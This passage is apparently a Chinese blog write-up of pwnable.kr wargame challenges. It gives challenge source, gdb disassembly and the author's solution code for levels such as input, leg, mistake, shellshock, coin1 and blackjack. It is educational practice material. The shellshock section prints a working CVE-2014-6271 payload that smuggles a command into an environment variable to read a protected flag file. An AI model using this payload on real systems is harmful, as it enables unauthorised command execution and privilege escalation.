printf(&quot;Stage 4 clear!\n&quot;);	</div><div class="line"></div><div class="line">	// network</div><div class="line">	int sd, cd;</div><div class="line">	struct sockaddr_in saddr, caddr;</div><div class="line">	sd = socket(AF_INET, SOCK_STREAM, 0);</div><div class="line">	if(sd == -1)&#123;</div><div class="line">		printf(&quot;socket error, tell admin\n&quot;);</div><div class="line">		return 0;</div><div class="line">	&#125;</div><div class="line">	saddr.sin_family = AF_INET;</div><div class="line">	saddr.sin_addr.s_addr = INADDR_ANY;</div><div class="line">	saddr.sin_port = htons( atoi(argv[&apos;C&apos;]) );</div><div class="line">	if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;</div><div class="line">		printf(&quot;bind error, use another port\n&quot;);</div><div class="line">    		return 1;</div><div class="line">	&#125;</div><div class="line">	listen(sd, 1);</div><div class="line">	int c = sizeof(struct sockaddr_in);</div><div class="line">	cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);</div><div class="line">	if(cd &lt; 0)&#123;</div><div class="line">		printf(&quot;accept error, tell admin\n&quot;);</div><div class="line">		return 0;</div><div class="line">	&#125;</div><div class="line">	if( recv(cd, buf, 4, 0) != 4 ) return 0;</div><div class="line">	if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0;</div><div class="line">	printf(&quot;Stage 5 clear!\n&quot;);</div><div class="line"></div><div class="line">	// here&apos;s your flag</div><div class="line">	system(&quot;/bin/cat flag&quot;);	</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>作为一个新手咋的一看99个参数很头疼，不过认真分析代码，可以利用linux socket编程来解决。满足条件就可以通关。</p>
<p>0x00 Stage 1<br>argv[65] = “\x00” argv[66] = “\x20\x0a\x0d”</p>
<p>0x01 Stage 2<br>从标准输入文件中读取4字节，比较前四个字节 \x00\x0a\x00\xff<br>从标准错误文件中读取4字节，比较前四个字节 \x00\x0a\x02\xff</p>
<p>0x02 Stage 3<br>环境变量deadbeef的值要为\xca\xfe\xba\xbe</p>
<p>0x03 Stage 4<br>从名为”\x0a”的文件读取四字节判断是否为\x00\x00\x00\x00</p>
<p>0x04 Stage 5<br>创建一个tcp的socket对象</p>
<blockquote>
<p>sin_family是协议簇用AF_INET表示TCP/IP<br>sin_addr是一个联合体，表示ip地址，INADDR_ANY也就是0.0.0.0，<br>sin_port 监听端口号为argv[67]的值<br>接收四字节为\xde\xad\xbe\xef的数据</p>
</blockquote>
<p>0x05 满足条件，获得flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;sys/types.h&gt;  </div><div class="line">#include&lt;sys/socket.h&gt;  </div><div class="line">#include&lt;netinet/in.h&gt;  </div><div class="line">#include&lt;unistd.h&gt; </div><div class="line">#include&lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char *argv[100] = &#123;0&#125;;</div><div class="line">	char *envp[2] = &#123;0&#125;;</div><div class="line">	int i;</div><div class="line">	pid_t pid;</div><div class="line">	</div><div class="line">	//99个参数初始化</div><div class="line">	for (i = 0;i &lt; 100; i++)&#123;</div><div class="line">		argv[i] = &quot;a&quot;;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	//Stage 1</div><div class="line">	argv[65] = &quot;\x00&quot;;</div><div class="line">	argv[66] = &quot;\x20\x0a\x0d&quot;;</div><div class="line">	argv[67] = &quot;55555&quot;;</div><div class="line">	</div><div class="line">	//Stage 2</div><div class="line">	envp[0] = &quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;;</div><div class="line">	</div><div class="line">	</div><div class="line">	//Stage 3</div><div class="line">	//创建子进程input</div><div class="line">	int pip0[2];</div><div class="line">	int pip2[2];</div><div class="line">	if (pipe(pip0) &lt; 0 || pipe(pip2) &lt; 0)&#123;</div><div class="line">		printf(&quot;pipe error\n&quot;);</div><div class="line">	&#125;</div><div class="line">	if((pid = fork()) == 0)&#123;</div><div class="line">		dup2(pip0[0], 0);	</div><div class="line">		dup2(pip2[0], 2);</div><div class="line">		close(pip0[1]);</div><div class="line">		close(pip2[1]);</div><div class="line">		execve(&quot;/home/input2/input&quot;,argv,envp);</div><div class="line">	&#125;</div><div class="line">	else if (pid == -1)&#123;</div><div class="line">		printf(&quot;fork error\n&quot;);</div><div class="line">	&#125;</div><div class="line">	else &#123;</div><div class="line">		sleep(1);</div><div class="line">		close(pip0[0]);</div><div class="line">		write(pip0[1],&quot;\x00\x0a\x00\xff&quot;,4);</div><div class="line">		close(pip2[0]);</div><div class="line">		write(pip2[1],&quot;\x00\x0a\x02\xff&quot;, 4);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	sleep(3);</div><div class="line"></div><div class="line">	//Stage 4</div><div class="line">        FILE* fp;</div><div class="line">        if ((fp  = fopen(&quot;\x0a&quot;, &quot;wb&quot;)))</div><div class="line">        &#123;</div><div class="line">                fwrite(&quot;\x00\x00\x00\x00&quot;, 4, 1, fp);</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">                printf(&quot;file error\n&quot;);</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">	</div><div class="line">	//Stage 5</div><div class="line">	int s;  </div><div class="line">	int len;  </div><div class="line">	struct sockaddr_in addr;</div><div class="line">	char buf[8];</div><div class="line">	</div><div class="line">	//清零</div><div class="line">	memset(&amp;addr,0,sizeof(addr));</div><div class="line">	addr.sin_family = AF_INET;</div><div class="line">	addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</div><div class="line">	addr.sin_port = htons(55555);</div><div class="line">	</div><div class="line">	s = socket(AF_INET, SOCK_STREAM,0);</div><div class="line">	connect(s,(struct sockaddr *)&amp;addr,sizeof(struct sockaddr));</div><div class="line">	</div><div class="line">	strcpy(buf,&quot;\xde\xad\xbe\xef&quot;);</div><div class="line">	send(s,buf,strlen(buf),0);  </div><div class="line"> </div><div class="line">	close(s);//关闭套接字   	</div><div class="line">	</div><div class="line">	return 0;		</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;很尴尬没有写的权利，回到/tmp然后再把flag链接过去，获得flag。这一步是看别人的writeup学的。</p>
<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><p>leg.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">int key1()&#123;</div><div class="line">        asm(&quot;mov r3, pc\n&quot;);</div><div class="line">&#125;</div><div class="line">int key2()&#123;</div><div class="line">        asm(</div><div class="line">        &quot;push   &#123;r6&#125;\n&quot;</div><div class="line">        &quot;add    r6, pc, $1\n&quot;</div><div class="line">        &quot;bx     r6\n&quot;</div><div class="line">        &quot;.code   16\n&quot;</div><div class="line">        &quot;mov    r3, pc\n&quot;</div><div class="line">        &quot;add    r3, $0x4\n&quot;</div><div class="line">        &quot;push   &#123;r3&#125;\n&quot;</div><div class="line">        &quot;pop    &#123;pc&#125;\n&quot;</div><div class="line">        &quot;.code  32\n&quot;</div><div class="line">        &quot;pop    &#123;r6&#125;\n&quot;</div><div class="line">        );</div><div class="line">&#125;</div><div class="line">int key3()&#123;</div><div class="line">        asm(&quot;mov r3, lr\n&quot;);</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line">        int key=0;</div><div class="line">        printf(&quot;Daddy has very strong arm! : &quot;);</div><div class="line">        scanf(&quot;%d&quot;, &amp;key);</div><div class="line">        if( (key1()+key2()+key3()) == key )&#123;</div><div class="line">                printf(&quot;Congratz!\n&quot;);</div><div class="line">                int fd = open(&quot;flag&quot;, O_RDONLY);</div><div class="line">                char buf[100];</div><div class="line">                int r = read(fd, buf, 100);</div><div class="line">                write(0, buf, r);</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">                printf(&quot;I have strong leg :P\n&quot;);</div><div class="line">        &#125;</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;可以看出只要算出key1()+key2()+key3()就可以获得flag，即它们的返回值，返回值在r0中。<br>先看key()1，这里把pc赋给r0寄存器作为返回值，而pc指向下两条指令的地址，arm中流水线预取两条指令，就是0x8ce4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) disass key1</div><div class="line">Dump of assembler code for function key1:</div><div class="line">   0x00008cd4 &lt;+0&gt;:     push    &#123;r11&#125;           ; (str r11, [sp, #-4]!)</div><div class="line">   0x00008cd8 &lt;+4&gt;:     add     r11, sp, #0</div><div class="line">   0x00008cdc &lt;+8&gt;:     mov     r3, pc		//把pc值赋给r0作为返回值</div><div class="line">   0x00008ce0 &lt;+12&gt;:    mov     r0, r3</div><div class="line">   0x00008ce4 &lt;+16&gt;:    sub     sp, r11, #0</div><div class="line">   0x00008ce8 &lt;+20&gt;:    pop     &#123;r11&#125;           ; (ldr r11, [sp], #4)</div><div class="line">   0x00008cec &lt;+24&gt;:    bx      lr</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;再看key2(),思路依旧是先找r0，从r0定位到r3，r3 = pc+4，pc=0x8d08，所以r0=0x8d0c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">(gdb) disass key2</div><div class="line">Dump of assembler code for function key2:</div><div class="line">   0x00008cf0 &lt;+0&gt;:     push    &#123;r11&#125;           ; (str r11, [sp, #-4]!)</div><div class="line">   0x00008cf4 &lt;+4&gt;:     add     r11, sp, #0</div><div class="line">   0x00008cf8 &lt;+8&gt;:     push    &#123;r6&#125;            ; (str r6, [sp, #-4]!)</div><div class="line">   0x00008cfc &lt;+12&gt;:    add     r6, pc, #1</div><div class="line">   0x00008d00 &lt;+16&gt;:    bx      r6</div><div class="line">   0x00008d04 &lt;+20&gt;:    mov     r3, pc</div><div class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</div><div class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</div><div class="line">   0x00008d0a &lt;+26&gt;:    pop     &#123;pc&#125;</div><div class="line">   0x00008d0c &lt;+28&gt;:    pop     &#123;r6&#125;            ; (ldr r6, [sp], #4)</div><div class="line">   0x00008d10 &lt;+32&gt;:    mov     r0, r3</div><div class="line">   0x00008d14 &lt;+36&gt;:    sub     sp, r11, #0</div><div class="line">   0x00008d18 &lt;+40&gt;:    pop     &#123;r11&#125;           ; (ldr r11, [sp], #4)</div><div class="line">   0x00008d1c &lt;+44&gt;:    bx      lr</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;key3()中r0=lr，LR是链接寄存器，保存子程序的返回地址，这里即key3的第一条指令地址，0x8d20<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) disass key3</div><div class="line">Dump of assembler code for function key3:</div><div class="line">   0x00008d20 &lt;+0&gt;:     push    &#123;r11&#125;           ; (str r11, [sp, #-4]!)</div><div class="line">   0x00008d24 &lt;+4&gt;:     add     r11, sp, #0</div><div class="line">   0x00008d28 &lt;+8&gt;:     mov     r3, lr</div><div class="line">   0x00008d2c &lt;+12&gt;:    mov     r0, r3</div><div class="line">   0x00008d30 &lt;+16&gt;:    sub     sp, r11, #0</div><div class="line">   0x00008d34 &lt;+20&gt;:    pop     &#123;r11&#125;           ; (ldr r11, [sp], #4)</div><div class="line">   0x00008d38 &lt;+24&gt;:    bx      lr</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;综上可以得解。</p>
<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>mistake.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line"></div><div class="line">#define PW_LEN 10</div><div class="line">#define XORKEY 1</div><div class="line"></div><div class="line">void xor(char* s, int len)&#123;</div><div class="line">        int i;</div><div class="line">        for(i=0; i&lt;len; i++)&#123;</div><div class="line">                s[i] ^= XORKEY;</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char* argv[])&#123;</div><div class="line"></div><div class="line">        int fd;</div><div class="line">        if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;</div><div class="line">                printf(&quot;can&apos;t open password %d\n&quot;, fd);</div><div class="line">                return 0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        printf(&quot;do not bruteforce...\n&quot;);</div><div class="line">        sleep(time(0)%20);</div><div class="line"></div><div class="line">        char pw_buf[PW_LEN+1];</div><div class="line">        int len;</div><div class="line">        if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</div><div class="line">                printf(&quot;read error\n&quot;);</div><div class="line">                close(fd);</div><div class="line">                return 0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        char pw_buf2[PW_LEN+1];</div><div class="line">        printf(&quot;input password : &quot;);</div><div class="line">        scanf(&quot;%10s&quot;, pw_buf2);</div><div class="line"></div><div class="line">        // xor your input</div><div class="line">        xor(pw_buf2, 10);</div><div class="line"></div><div class="line">        if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</div><div class="line">                printf(&quot;Password OK\n&quot;);</div><div class="line">                system(&quot;/bin/cat flag\n&quot;);</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">                printf(&quot;Wrong Password\n&quot;);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        close(fd);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;嗯…仔细看<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>是从stdin读取passwrod的，相当于自己写一个十位密码，然后再写一个10位的钥匙，每位和1异或以后和密码相等就可以获得flag，这是说平常不小心忘掉()引发的问题啊。密码我选十个1，解密我选十个0</p>
<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>shellshock.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">int main()&#123;</div><div class="line">        setresuid(getegid(), getegid(), getegid());</div><div class="line">        setresgid(getegid(), getegid(), getegid());</div><div class="line">        system(&quot;/home/shellshock/bash -c &apos;echo shock_me&apos;&quot;);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;题目是一个漏洞的名称，漏洞代码:CVE-2014-6271。让我们在定义环境变量时，可以执行额外的语句。这里想执行<code>cat flag</code>的话需要root权限，所以在调用shellshock的基础上利用这个漏洞。脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"> </div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char *envp[2]=&#123;0&#125;;</div><div class="line">	envp[0]=&quot;x=() &#123; :; &#125;; /home/shellshock/bash -c \&quot;cat /home/shellshock/flag\&quot;&quot;;</div><div class="line">	execve(&quot;/home/shellshock/shellshock&quot;,NULL,envp);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>&emsp;&emsp;这是一个硬币游戏，通过称重从真硬币中找出假硬币，真的硬币要重一些，称重机会有限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">	---------------------------------------------------</div><div class="line">	-              Shall we play a game?              -</div><div class="line">	---------------------------------------------------</div><div class="line">	</div><div class="line">	You have given some gold coins in your hand</div><div class="line">	however, there is one counterfeit coin among them</div><div class="line">	counterfeit coin looks exactly same as real coin</div><div class="line">	however, its weight is different from real one</div><div class="line">	real coin weighs 10, counterfeit coin weighes 9</div><div class="line">	help me to find the counterfeit coin with a scale</div><div class="line">	if you find 100 counterfeit coins, you will get reward :)</div><div class="line">	FYI, you have 30 seconds.</div><div class="line">	</div><div class="line">	- How to play - </div><div class="line">	1. you get a number of coins (N) and number of chances (C)</div><div class="line">	2. then you specify a set of index numbers of coins to be weighed</div><div class="line">	3. you get the weight information</div><div class="line">	4. 2~3 repeats C time, then you give the answer</div><div class="line">	</div><div class="line">	- Example -</div><div class="line">	[Server] N=4 C=2 	# find counterfeit among 4 coins with 2 trial</div><div class="line">	[Client] 0 1 		# weigh first and second coin</div><div class="line">	[Server] 20			# scale result : 20</div><div class="line">	[Client] 3			# weigh fourth coin</div><div class="line">	[Server] 10			# scale result : 10</div><div class="line">	[Client] 2 			# counterfeit coin is third!</div><div class="line">	[Server] Correct!</div><div class="line"></div><div class="line">	- Ready? starting in 3 sec... -</div><div class="line">	</div><div class="line">N=893 C=10</div><div class="line">time expired! bye!</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;因为只有一个假硬币，所以一直采用二分法，看假硬币被分在哪一边。代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># coding=utf-8</div><div class="line"></div><div class="line">__author__ = &apos;Wu Weinan&apos;</div><div class="line"></div><div class="line">import socket</div><div class="line">import time</div><div class="line"></div><div class="line">host = &apos;143.248.249.64&apos;</div><div class="line">port = 9007</div><div class="line"> </div><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((host,port))</div><div class="line"> </div><div class="line">rec = s.recv(9999)</div><div class="line">time.sleep(4)</div><div class="line"> </div><div class="line">for m in xrange(100):</div><div class="line"> </div><div class="line">    time.sleep(0.1)</div><div class="line">    rec = s.recv(9999)</div><div class="line">    #print rec</div><div class="line">    index = rec.find(&quot;N=&quot;)</div><div class="line">    </div><div class="line">    #获得N和C</div><div class="line">    if index &gt;= 0:</div><div class="line">        tmp = rec[index:].split(&quot; &quot;)</div><div class="line">        N = int(tmp[0][2:])</div><div class="line">        C = int(tmp[1][2:])</div><div class="line">        print &quot;GET N=%d C=%d&quot; % (N,C)</div><div class="line">    else:</div><div class="line">        print &quot;failed&quot;</div><div class="line">    </div><div class="line">    #二分法</div><div class="line">    low = 0</div><div class="line">    start = 0</div><div class="line">    end = N - 1</div><div class="line">    mid = N / 2</div><div class="line">    high = mid</div><div class="line">    result = &quot;&quot;</div><div class="line">    #必须称重C次</div><div class="line">    for i in xrange(C):</div><div class="line">        temp = [str(n) for n in range(low, high+1)]</div><div class="line">        #print temp</div><div class="line">        sends = &quot; &quot;.join(temp)</div><div class="line">        #print sends</div><div class="line">        s.send(sends+&quot;\n&quot;)</div><div class="line">        rec = s.recv(9999)</div><div class="line">        weight = int(rec)</div><div class="line">        if weight != ((high-low+1) * 10):</div><div class="line">            end = mid</div><div class="line">            mid = (end + start) / 2</div><div class="line">            high = mid</div><div class="line">        else:</div><div class="line">            start = mid + 1</div><div class="line">            low = start</div><div class="line">            mid = (end + start) / 2</div><div class="line">            high = mid</div><div class="line"></div><div class="line">        if start &gt;= end:</div><div class="line">            result = str(start)</div><div class="line">            break</div><div class="line">        </div><div class="line">    while i &lt; C:</div><div class="line">        s.send(result+&quot;\n&quot;)</div><div class="line">        rec = s.recv(9999)</div><div class="line">        i+=1</div><div class="line">    print rec</div><div class="line">        </div><div class="line">time.sleep(0.2)</div><div class="line">rec = s.recv(9999)</div><div class="line">print &quot;flag=&quot;,rec</div><div class="line"></div><div class="line">s.close()</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;在本机上运行的话时间来不及解出100次，所以要去/tmp下运行，可以得到flag</p>
<h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><p>&emsp;&emsp;题目中给了一个链接，这个是一个21点游戏的代码，题目说要赢100w美元以后才能获得flag，起始有500美元，代码链接<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html。顺着代码看，进入play()后，在输入下注金额时，检查完金额不足后，却将第二次输入的金额直接返回了。" target="_blank" rel="external">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html。顺着代码看，进入play()后，在输入下注金额时，检查完金额不足后，却将第二次输入的金额直接返回了。</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">void play() //Plays game</div><div class="line">&#123;</div><div class="line">     </div><div class="line">     int p=0; // holds value of player_total</div><div class="line">     int i=1; // counter for asking user to hold or stay (aka game turns)</div><div class="line">     char choice3;</div><div class="line">     </div><div class="line">     cash = cash;</div><div class="line">     cash_test();</div><div class="line">     printf(&quot;\nCash: $%d\n&quot;,cash); //Prints amount of cash user has</div><div class="line">     randcard(); //Generates random card</div><div class="line">     player_total = p + l; //Computes player total</div><div class="line">     p = player_total;</div><div class="line">     printf(&quot;\nYour Total is %d\n&quot;, p); //Prints player total</div><div class="line">     dealer(); //Computes and prints dealer total</div><div class="line">     betting(); //Prompts user to enter bet amount</div><div class="line">     ···</div><div class="line"></div><div class="line">int betting() //Asks user amount to bet</div><div class="line">&#123;</div><div class="line"> printf(&quot;\n\nEnter Bet: $&quot;);</div><div class="line"> scanf(&quot;%d&quot;, &amp;bet);</div><div class="line"></div><div class="line"> if (bet &gt; cash) //If player tries to bet more money than player has</div><div class="line"> &#123;</div><div class="line">		printf(&quot;\nYou cannot bet more money than you have.&quot;);</div><div class="line">		printf(&quot;\nEnter Bet: &quot;);</div><div class="line">        scanf(&quot;%d&quot;, &amp;bet);</div><div class="line">        return bet;</div><div class="line"> &#125;</div><div class="line"> else return bet;</div><div class="line">&#125; // End Function</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;所以先输入比500大的数，第二次输入1000000，然后赢一局就是百万富翁了。但是并没有显示flag,试过离开后又试了下继续，就可以看到一个神奇的flag了。</p>
<h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div 